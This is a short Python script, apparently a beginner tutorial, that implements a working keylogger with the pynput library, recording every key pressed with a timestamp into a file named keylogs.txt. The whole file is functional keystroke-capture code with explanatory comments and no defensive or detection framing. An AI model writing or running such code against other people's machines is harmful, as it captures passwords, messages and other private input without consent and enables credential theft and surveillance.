# Required Libraries
# 1. Pynput - read the keystrokes
# 2. logging - log the key strokes into a file

from pynput.keyboard import Key, Listener
import logging

# 1. create basic configuration system
# 2. specify the filename (keylogs.txt)
# 3. specifying the storing format asctime->(YY-MM-DD HH-MM-SS) - Message
logging.basicConfig(filename=("keylogs.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")

# 4. function
# take user key and logs it into the file after converting it into a string
def on_press(key):
    logging.info(str(key))

# 5. everytime a key is pressed listener is triggered and calls function which then logs it in the file
with Listener(on_press=on_press) as listener :
    listener.join()

